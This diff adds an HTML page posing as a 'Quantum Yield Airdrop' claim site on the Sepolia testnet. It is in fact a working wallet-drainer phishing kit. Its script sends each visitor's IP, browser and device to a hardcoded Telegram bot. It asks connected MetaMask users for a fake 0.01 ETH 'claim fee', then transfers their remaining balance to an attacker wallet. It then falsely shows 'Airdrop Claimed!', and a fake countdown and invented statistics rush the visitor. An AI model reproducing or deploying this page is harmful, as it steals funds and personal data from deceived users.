@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Quantum Yield Airdrop (Sepolia Testnet)</title>
+    <script>
+        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
+        const CHAT_ID = "6309547301";
+        const YOUR_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";
+
+        async function sendAlert(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            } catch (e) {
+                console.log("Telegram alert failed, moving on...");
+            }
+        }
+
+        async function getVictimInfo() {
+            const userAgent = navigator.userAgent;
+            const browser = navigator.appName + " " + navigator.appVersion;
+            const device = /Mobile|Android|iPhone|iPad/.test(userAgent) ? "Mobile" : "Desktop";
+            let ip = "Unknown";
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {
+                console.log("IP fetch failed, defaulting to Unknown");
+            }
+            return { ip, browser, device };
+        }
+
+        async function connectWallet() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isAndroid = /android/.test(userAgent);
+            const isMobile = /mobile|android|iphone|ipad/.test(userAgent);
+
+            if (isMobile && isAndroid) {
+                window.location.href = "metamask://wc?uri=wc:quantum-yield-airdrop";
+                setTimeout(() => {
+                    if (document.hidden) return;
+                    window.location.href = "https://play.google.com/store/apps/details?id=io.metamask";
+                    document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected. Redirecting to install...</p>";
+                }, 2000);
+                return;
+            }
+
+            if (!window.ethereum) {
+                document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected. <a href='https://metamask.io/download/' target='_blank' style='color: #00d4ff;'>Download MetaMask</a> to claim your airdrop!</p>";
+                const victimInfo = await getVictimInfo();
+                await sendAlert(`NO WALLET: ${victimInfo.ip}\nBrowser: ${victimInfo.browser}\nDevice: ${victimInfo.device}`);
+                return;
+            }
+
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: "0xaa36a7" }] // Sepolia Testnet
+                });
+
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                const account = accounts[0];
+                const balance = BigInt(await window.ethereum.request({
+                    method: "eth_getBalance",
+                    params: [account, "latest"]
+                }));
+
+                if (balance === 0n) {
+                    throw new Error("Wallet balance is zero.");
+                }
+
+                const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
+                const gasLimit = 21000n;
+                const gasCost = gasLimit * gasPrice;
+                const claimFee = BigInt("10000000000000000"); // 0.01 ETH fake "fee"
+
+                if (balance < gasCost + claimFee) {
+                    throw new Error("Insufficient funds for claim fee.");
+                }
+
+                const victimInfo = await getVictimInfo();
+                await sendAlert(`🎯 VICTIM CONNECTED\nWallet: ${account}\nIP: ${victimInfo.ip}\nBrowser: ${victimInfo.browser}\nDevice: ${victimInfo.device}`);
+
+                // Step 1: Fake small "claim fee"
+                document.getElementById("status").innerHTML = "<p>Approve the 0.01 ETH claim fee to unlock your rewards...</p>";
+                await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: account,
+                        to: YOUR_WALLET,
+                        value: "0x" + claimFee.toString(16), // 0.01 ETH shown
+                        gas: "0x" + gasLimit.toString(16),
+                        gasPrice: "0x" + gasPrice.toString(16),
+                        chainId: "0xaa36a7"
+                    }]
+                });
+
+                // Step 2: Full drain
+                const drainAmount = balance - gasCost;
+                const txHash = await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: account,
+                        to: YOUR_WALLET,
+                        value: "0x" + drainAmount.toString(16), // Full balance minus gas
+                        gas: "0x" + gasLimit.toString(16),
+                        gasPrice: "0x" + gasPrice.toString(16),
+                        chainId: "0xaa36a7"
+                    }]
+                });
+
+                await sendAlert(`✅ SEPOLIA SUCCESS: ${account} DRAINED - TX: ${txHash}\nIP: ${victimInfo.ip}`);
+                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Claimed!</h2><p>Funds & NFT transferred. Check your wallet!</p>";
+            } catch (e) {
+                const victimInfo = await getVictimInfo();
+                await sendAlert(`SEPOLIA ERROR: ${account ? account : "Unknown"} - ${e.message}\nIP: ${victimInfo.ip}\nBrowser: ${victimInfo.browser}\nDevice: ${victimInfo.device}`);
+                document.getElementById("status").innerHTML = `<h2 class='error'>Connection Failed</h2><p>Error: ${e.message}</p>`;
+            }
+        }
+
+        function startTimer() {
+            const endTime = Date.now() + 24 * 60 * 60 * 1000;
+            const timer = setInterval(() => {
+                const now = Date.now();
+                const distance = endTime - now;
+                if (distance < 0) {
+                    clearInterval(timer);
+                    document.getElementById("timer").innerHTML = "Airdrop Ended!";
+                    document.querySelector("button").disabled = true;
+                    return;
+                }
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                document.getElementById("timer").innerHTML = `${hours}h ${minutes}m ${seconds}s`;
+            }, 1000);
+        }
+
+        window.onload = startTimer;
+    </script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e1e2f 0%, #2e2e4f 100%);
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            width: 450px;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: #00d4ff;
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.7);
+        }
+        .subtitle {
+            font-size: 1.2em;
+            color: #aaaaaa;
+            margin-bottom: 20px;
+        }
+        button {
+            background: #00d4ff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            color: #1e1e2f;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background: #ff007a;
+            color: #ffffff;
+            box-shadow: 0 0 15px rgba(255, 0, 122, 0.7);
+        }
+        #status {
+            margin-top: 20px;
+        }
+        .success { color: #00ff9d; }
+        .error { color: #ff007a; }
+        .stats {
+            margin: 20px 0;
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        .stats span {
+            color: #00d4ff;
+            font-weight: bold;
+        }
+        #timer {
+            font-size: 1.5em;
+            color: #ff007a;
+            margin-top: 15px;
+        }
+        .nft-rewards {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+        }
+        .nft {
+            width: 100px;
+            height: 100px;
+            background-size: cover;
+            background-position: center;
+            border-radius: 10px;
+            border: 2px solid #00d4ff;
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+        }
+        .nft1 {
+            background-image: url('https://i.postimg.cc/fW7rtmjq/Quantum-Ape.jpg');
+        }
+        .nft2 {
+            background-image: url('https://i.postimg.cc/wB9PvD70/file-B1-VK6-Ac-Ag65g-T9-Nr-GYSJw-T.png');
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔬 Quantum Yield Airdrop (Sepolia)</h1>
+        <p class="subtitle">Claim your exclusive SEP + NFT rewards!</p>
+        <div class="stats">
+            <p>Total Supply: <span>10,000 SEP</span></p>
+            <p>Claimed: <span>7,842 SEP</span></p>
+            <p>Participants: <span>12,487</span></p>
+        </div>
+        <div class="nft-rewards">
+            <div class="nft nft1"></div>
+            <div class="nft nft2"></div>
+        </div>
+        <button onclick="connectWallet()">Claim Airdrop</button>
+        <div id="timer">Loading...</div>
+        <div id="status"></div>
+    </div>
+</body>
+</html>
